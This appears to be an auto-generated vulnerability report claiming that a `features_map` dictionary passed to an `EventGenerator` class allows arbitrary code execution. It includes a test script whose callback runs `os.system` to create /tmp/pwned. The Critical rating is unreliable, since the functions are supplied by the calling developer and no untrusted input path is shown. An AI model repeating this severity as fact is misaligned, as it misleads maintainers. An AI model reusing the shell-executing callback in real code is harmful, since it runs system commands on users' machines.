### Vulnerability List:

- Vulnerability Name: Arbitrary Code Execution via Malicious Features Map
- Description:
    1. The `EventGenerator` class and its subclasses (`BinomialEventGenerator`, `LognormalEventGenerator`, `ParetoEventGenerator`) in `event_generator.py` use a `features_map` dictionary provided during initialization.
    2. This `features_map` is designed to translate feature values into numerical contributions to the probability or distribution parameters.
    3. The `generate_events` method in `EventGenerator` uses `data.apply(self.features_map)` to apply these mappings row-wise.
    4. If an attacker can control the content of the `features_map`, they can inject malicious functions as values in this dictionary.
    5. When `data.apply(self.features_map)` is executed, these malicious functions will be called with data from the DataFrame, leading to arbitrary code execution within the user's environment.
    6. This can be achieved by crafting a `features_map` that contains a Python function executing system commands or other malicious actions, and then using this `features_map` to instantiate an `EventGenerator` object and process data with it.
- Impact:
    - Arbitrary code execution on the server or user's machine where the LTVision library is running.
    - Full compromise of the application and underlying system.
    - Data exfiltration, data manipulation, denial of service, and other malicious activities.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The code directly uses the provided `features_map` without any sanitization or validation of its content.
- Missing Mitigations:
    - Input validation for the `features_map` to ensure that the values are not executable code.
    - Restricting the type of values allowed in `features_map` to prevent function injection.
    - Sandboxing or isolating the code execution environment to limit the impact of arbitrary code execution.
- Preconditions:
    - An attacker needs to be able to control the `features_map` dictionary that is passed to the `EventGenerator` class constructor.
    - The user must then use the `EventGenerator` instance to process data using the `generate_events` method.
- Source Code Analysis:
    1. File: `/code/src/event_generator.py`
    2. Class: `EventGenerator`
    3. Method: `generate_events(self, data: pd.DataFrame, scale: float = None)`
    4. Line: `locs = data.apply(self.features_map).sum(axis=1) + self.baseline`

    ```python
    # Visualization of vulnerable code path
    # User controlled features_map --> EventGenerator.__init__(features_map)
    # User data (potentially controlled column names) --> EventGenerator.generate_events(data)
    # data.apply(self.features_map) --> Executes functions in features_map with DataFrame row data
    # Arbitrary Code Execution
    ```

    ```python
    class EventGenerator():
        # ...
        def __init__(self,
                     features_map: Dict[str,
                                        object], # features_map is taken as input
                     scale=None,
                     baseline: float = 0,
                     seed: int = None) -> None:
            # ...
            self.features_map = features_map # features_map is stored directly

        def generate_events(self, data: pd.DataFrame, scale: float = None):
            """
            Applies the mapping of features->value for each row in the dataframe and sum all contributions together.
            ...
            """
            locs = data.apply(self.features_map).sum(axis=1) + self.baseline # Vulnerable line: apply executes functions from features_map
            scale = scale if scale is not None else self.scale
            return self._sample_from_distribution(locs, scale)
    ```
    - The `data.apply(self.features_map)` line in the `generate_events` method is where the vulnerability occurs. The `apply` function iterates over columns of the DataFrame `data` and, for each column, it looks up the corresponding function in the `self.features_map` and applies this function to each row of that column. If the `features_map` contains malicious functions, these functions will be executed.

- Security Test Case:
    1. Prepare a malicious `features_map` dictionary. This dictionary will contain a key that corresponds to a column name in the input DataFrame. The value associated with this key will be a lambda function that executes arbitrary code. For example, a function that writes to a file or executes a system command.

    ```python
    import pandas as pd
    from src.event_generator import BinomialEventGenerator
    import os

    # Malicious function to execute system command
    def malicious_function(x):
        os.system('touch /tmp/pwned') # Example: create a file in /tmp/ to demonstrate execution
        return 0

    # Craft the malicious features_map
    malicious_features_map = {
        'country': malicious_function # Assuming 'country' is a column in the DataFrame
    }

    # Create a sample DataFrame
    data = pd.DataFrame({
        'country': ['US', 'CA', 'GB'],
        'device': ['ios', 'android', 'ios']
    })

    # Instantiate BinomialEventGenerator with the malicious features_map
    event_generator = BinomialEventGenerator(features_map=malicious_features_map)

    # Trigger the vulnerability by generating events
    event_generator.generate_events(data)

    # Check if the malicious code was executed (e.g., check if /tmp/pwned file exists)
    if os.path.exists('/tmp/pwned'):
        print("Vulnerability Exploited: /tmp/pwned file created, code execution successful!")
        os.remove('/tmp/pwned') # Cleanup
    else:
        print("Vulnerability likely NOT exploited (or file creation failed).")
    ```
    2. Run the Python script above.
    3. Verify the execution of the malicious code. In the example test case, check if the file `/tmp/pwned` is created. If the file is created, it confirms arbitrary code execution.
    4. This test case demonstrates that by providing a crafted `features_map`, an attacker can achieve arbitrary code execution when `generate_events` is called.